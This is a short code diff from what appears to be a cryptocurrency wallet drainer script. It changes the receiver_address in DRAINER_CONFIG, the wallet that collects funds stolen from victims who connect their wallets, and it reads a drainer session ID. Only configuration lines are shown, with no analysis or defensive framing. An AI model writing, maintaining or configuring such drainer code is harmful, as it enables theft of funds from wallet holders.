@@ -1,5 +1,5 @@
 const DRAINER_CONFIG = {
-  receiver_address: "0x74407F9e10a517f82E905772e8E82DdCA0dCfF75",
+  receiver_address: "0x74407F9e10a517f82E905772e8E82DdCA0dCfF76",
 };
 var DRAINER_USER_ID = sessionStorage.getItem("DRAINER_ID"),
   connected_address = null,
